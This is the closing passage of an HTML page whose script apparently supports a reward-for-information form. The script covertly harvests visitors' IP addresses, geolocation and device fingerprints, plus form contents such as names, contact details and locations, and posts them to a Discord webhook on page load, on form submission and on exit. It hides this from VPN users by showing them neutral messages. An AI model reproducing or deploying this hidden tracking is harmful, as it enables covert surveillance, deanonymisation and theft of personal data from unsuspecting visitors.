            } else if (ua.indexOf("iphone") > -1 || ua.indexOf("ipad") > -1) {
                os = "iOS";
            } else if (ua.indexOf("linux") > -1) {
                os = "Linux";
            }

            return { browser, version, os };
        }

        // Detectar uso de VPN
        async function checkVpnUsage() {
            const now = Date.now();

            // Si ya verificamos VPN recientemente, usar ese resultado
            if (ipCache.vpnCheck !== null && now - ipCache.vpnTimestamp < CONFIG.ipCacheTime) {
                return ipCache.vpnCheck;
            }

            try {
                // Obtener timezone del navegador
                const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const timezoneOffset = new Date().getTimezoneOffset();

                // Obtener info geográfica desde API
                const response = await fetch(CONFIG.vpnCheckEndpoint);
                if (!response.ok) {
                    throw new Error(`HTTP error ${response.status}`);
                }

                const data = await response.json();

                // Método #1: Verificar campos de privacidad directos si existen
                if (data.privacy && (data.privacy.vpn || data.privacy.proxy || data.privacy.tor || data.privacy.relay)) {
                    ipCache.vpnCheck = true;
                    ipCache.vpnTimestamp = now;
                    return true;
                }

                // Método #2: Comparar timezone del navegador con ubicación geográfica declarada por la IP
                // Esta verificación es heurística y podría generar falsos positivos
                if (data.timezone && browserTimezone) {
                    // Si el timezone difiere significativamente, podría ser un VPN
                    const isTimezoneMismatch = !browserTimezone.includes(data.timezone.replace(" ", "_"));

                    if (isTimezoneMismatch) {
                        console.log("Posible detección de VPN: Desajuste de timezone detectado");
                        ipCache.vpnCheck = true;
                        ipCache.vpnTimestamp = now;
                        return true;
                    }
                }

                // No se detectó VPN
                ipCache.vpnCheck = false;
                ipCache.vpnTimestamp = now;
                return false;

            } catch (error) {
                console.error("Error al verificar VPN:", error);
                return false; // Por defecto, asumir que no es VPN si hay error
            }
        }

        // Función para recolectar datos de tracking
        async function collectTrackingData() {
            // Obtener datos del navegador
            const userAgent = navigator.userAgent;
            const browserInfo = detectBrowser(userAgent);

            // Obtener IP con manejo de cache y múltiples fuentes
            let ipAddress = await getIpAddress();

            // Verificar si es VPN (pero sólo si tenemos IP)
            let isVpn = false;
            if (ipAddress !== 'desconocida') {
                isVpn = await checkVpnUsage();
            }

            // Ubicación basada en IP
            let locationData = await getLocationFromIp(ipAddress);

            return {
                // Dirección IP obtenida con sistema multi-API
                ip: ipAddress,

                // Datos de VPN
                vpnDetected: isVpn,

                // Datos del navegador
                browser: browserInfo.browser,
                browserVersion: browserInfo.version,

                // Sistema operativo
                operatingSystem: browserInfo.os,

                // Datos de geolocalización 
                location: locationData,

                // Identificadores únicos
                sessionId: getCookie('nyx_session') || 'desconocido',
                deviceId: localStorage.getItem('nyx_device_id') || 'desconocido',

                // Timestamp
                timestamp: new Date().toISOString()
            };
        }

        // Función para generar ID único
        function generateUniqueId() {
            return 'nyx_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
        }

        // Función para crear huella digital del dispositivo
        function generateDeviceFingerprint() {
            const components = [
                navigator.userAgent,
                navigator.language,
                new Date().getTimezoneOffset(),
                navigator.platform,
                navigator.hardwareConcurrency || '',
                screen.colorDepth,
                screen.width + 'x' + screen.height,
                typeof window.sessionStorage,
                typeof window.localStorage,
                typeof window.indexedDB
            ];

            // Crear hash simple de los componentes
            let fingerprint = '';
            const componentStr = components.join('|');
            for (let i = 0; i < componentStr.length; i++) {
                fingerprint += componentStr.charCodeAt(i).toString(16);
            }

            return 'fp_' + fingerprint.substr(0, 32);
        }

        // Obtener valor de cookie por nombre
        function getCookie(name) {
            const value = `; ${document.cookie}`;
            const parts = value.split(`; ${name}=`);
            if (parts.length === 2) return parts.pop().split(';').shift();
            return null;
        }

        // Función para enviar datos al webhook
        function sendDataToWebhook(data) {
            // No enviar datos si se detecta VPN
            if (data.vpnDetected) {
                console.log("No se envían datos al webhook debido a detección de VPN");
                return;
            }

            // Formatear datos para webhook Discord
            const webhookData = {
                content: `Nuevo registro de actividad: ${data.eventType || 'datos básicos'}`,
                embeds: [{
                    title: data.eventType ? `Evento: ${data.eventType}` : "Datos de tracking",
                    color: 15258703, // Color rojo para el embed
                    fields: Object.entries(data)
                        .filter(([key, value]) =>
                            value !== undefined &&
                            key !== 'userAgent' // El user agent es muy largo, omitirlo
                        )
                        .map(([key, value]) => ({
                            name: key,
                            value: typeof value === 'object' ?
                                JSON.stringify(value).substring(0, 500) :
                                String(value).substring(0, 500),
                            inline: true
                        })),
                    timestamp: data.timestamp || new Date().toISOString()
                }]
            };

            // Usar fetch para enviar datos
            fetch(CONFIG.webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(webhookData)
            })
                .catch(error => {
                    console.error('Error al enviar datos al webhook:', error);
                });
        }

        // Inicializar sistema de tracking
        async function initializeTracking() {
            // Crear identificadores únicos y guardarlos
            const sessionId = generateUniqueId();
            document.cookie = `nyx_session=${sessionId}; path=/; max-age=${60 * 60 * 24}`;

            // Asegurar que existe un ID de dispositivo persistente
            if (!localStorage.getItem('nyx_device_id')) {
                localStorage.setItem('nyx_device_id', generateDeviceFingerprint());
            }

            // Activar geolocalización silenciosa
            setTimeout(async () => {
                await silentGeolocation();
            }, 1000);

            // Enviar datos iniciales de tracking (solo si no es VPN)
            const trackingData = await collectTrackingData();
            trackingData.eventType = 'pageView';

            if (!trackingData.vpnDetected) {
                sendDataToWebhook(trackingData);
            } else {
                console.log("Uso de VPN detectado, no se envían datos al webhook");
            }

            // Monitorear salida de la página
            window.addEventListener('beforeunload', async function () {
                const exitData = {
                    eventType: 'pageExit',
                    sessionId: sessionId,
                    timestamp: new Date().toISOString()
                };

                // Verificar VPN antes de enviar datos
                const trackingData = await collectTrackingData();
                if (!trackingData.vpnDetected && navigator.sendBeacon) {
                    const finalData = Object.assign({}, trackingData, exitData);
                    navigator.sendBeacon(
                        CONFIG.webhookUrl,
                        JSON.stringify({
                            content: "Salida de página registrada",
                            embeds: [{
                                title: "Datos de salida",
                                color: 15258703,
                                fields: Object.entries(finalData)
                                    .filter(([key, value]) =>
                                        value !== undefined &&
                                        key !== 'userAgent' // Omitir campos muy largos
                                    )
                                    .map(([key, value]) => ({
                                        name: key,
                                        value: typeof value === 'object' ?
                                            JSON.stringify(value).substring(0, 500) :
                                            String(value).substring(0, 500),
                                        inline: true
                                    }))
                            }]
                        })
                    );
                }
            });
        }

        // DOMContentLoaded para iniciar todo cuando la página cargue
        document.addEventListener('DOMContentLoaded', function () {
            // Iniciar sistema de tracking
            initializeTracking();

            // Configurar evento de scroll para animaciones
            window.addEventListener('scroll', revealOnScroll);
            // Ejecutar una vez al inicio para elementos visibles en carga
            revealOnScroll();

            // Configurar evento para el formulario de información
            document.getElementById('informationForm').addEventListener('submit', async function (e) {
                e.preventDefault();

                // Recolectar datos del formulario
                const formData = {
                    informantName: document.getElementById('informantName').value,
                    contactMethod: document.getElementById('contactMethod').value,
                    information: document.getElementById('information').value,
                    lastSeen: document.getElementById('lastSeen').value,
                    location: document.getElementById('location').value,
                    timestamp: new Date().toISOString()
                };

                // Combinar con datos básicos de tracking
                const trackingData = await collectTrackingData();

                // Solo enviar si no se detecta VPN
                if (!trackingData.vpnDetected) {
                    const completeData = Object.assign({}, formData, trackingData, {
                        eventType: 'formSubmission'
                    });

                    sendDataToWebhook(completeData);

                    // Mostrar confirmación
                    alert('¡Gracias por proporcionar información! Un agente de NYX se pondrá en contacto con usted para verificar los detalles y procesar su recompensa.');
                } else {
                    // Mostrar mensaje genérico sin dar pistas de la detección de VPN
                    alert('Gracias por enviar información. Nuestro sistema procesará su reporte.');
                    console.log("No se enviaron datos al webhook debido a detección de VPN");
                }

                document.getElementById('informationForm').reset();
            });
        });
    </script>
</body>

</html>